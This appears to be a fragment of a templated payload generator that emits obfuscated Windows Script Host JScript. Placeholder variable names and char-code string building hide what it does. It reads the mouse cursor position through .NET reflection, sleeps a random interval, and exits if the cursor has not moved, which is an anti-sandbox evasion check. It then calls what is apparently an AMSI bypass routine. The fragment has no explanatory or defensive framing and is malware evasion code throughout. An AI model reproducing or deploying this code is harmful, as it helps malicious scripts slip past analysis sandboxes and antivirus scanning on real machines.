        var {{ v.jsc_lv_a1 }}=new ActiveXObject({{ v.fn_build_str }}([{{ v.jsc_sys_refl_asm }}])),{{ v.jsc_lv_w1 }}={{ v.jsc_lv_a1 }}.LoadWithPartialName({{ v.fn_build_str }}([{{ v.jsc_sys_win_forms }}]));
        if({{ v.jsc_lv_w1 }}){var {{ v.jsc_lv_t1 }}={{ v.jsc_lv_w1 }}.GetType({{ v.fn_build_str }}([{{ v.jsc_sys_win_forms_cur }}]));
        if({{ v.jsc_lv_t1 }}){var {{ v.jsc_lv_pp1 }}={{ v.jsc_lv_t1 }}.GetProperty({{ v.fn_build_str }}([{{ v.jsc_cursor_position }}]),24);
        if({{ v.jsc_lv_pp1 }}){var {{ v.jsc_lv_ps1 }}={{ v.jsc_lv_pp1 }}.GetValue(null,null);if({{ v.jsc_lv_ps1 }}){ {{ v.jsc_lv_cx }}={{ v.jsc_lv_ps1 }}.GetType().GetProperty({{ v.fn_build_str }}([88])).GetValue({{ v.jsc_lv_ps1 }},null);{{ v.jsc_lv_cy }}={{ v.jsc_lv_ps1 }}.GetType().GetProperty({{ v.fn_build_str }}([89])).GetValue({{ v.jsc_lv_ps1 }},null);}}}}
    } catch(e) {}
    WScript.Sleep(2000 + Math.floor(Math.random() * 3000));
    if ({{ v.jsc_lv_cx }} !== -999) {
        try {
            var {{ v.jsc_lv_a2 }}=new ActiveXObject({{ v.fn_build_str }}([{{ v.jsc_sys_refl_asm }}])),{{ v.jsc_lv_w2 }}={{ v.jsc_lv_a2 }}.LoadWithPartialName({{ v.fn_build_str }}([{{ v.jsc_sys_win_forms }}]));
            if({{ v.jsc_lv_w2 }}){var {{ v.jsc_lv_t2 }}={{ v.jsc_lv_w2 }}.GetType({{ v.fn_build_str }}([{{ v.jsc_sys_win_forms_cur }}]));
            if({{ v.jsc_lv_t2 }}){var {{ v.jsc_lv_pp2 }}={{ v.jsc_lv_t2 }}.GetProperty({{ v.fn_build_str }}([{{ v.jsc_cursor_position }}]),24);
            if({{ v.jsc_lv_pp2 }}){var {{ v.jsc_lv_ps2 }}={{ v.jsc_lv_pp2 }}.GetValue(null,null);if({{ v.jsc_lv_ps2 }}){var {{ v.jsc_lv_cx2 }}={{ v.jsc_lv_ps2 }}.GetType().GetProperty({{ v.fn_build_str }}([88])).GetValue({{ v.jsc_lv_ps2 }},null);var {{ v.jsc_lv_cy2 }}={{ v.jsc_lv_ps2 }}.GetType().GetProperty({{ v.fn_build_str }}([89])).GetValue({{ v.jsc_lv_ps2 }},null);if({{ v.jsc_lv_cx }}==={{ v.jsc_lv_cx2 }}&&{{ v.jsc_lv_cy }}==={{ v.jsc_lv_cy2 }})WScript.Quit(0);}}}}
        } catch(e2) {}
    }
    {{ v.fn_amsi }}();
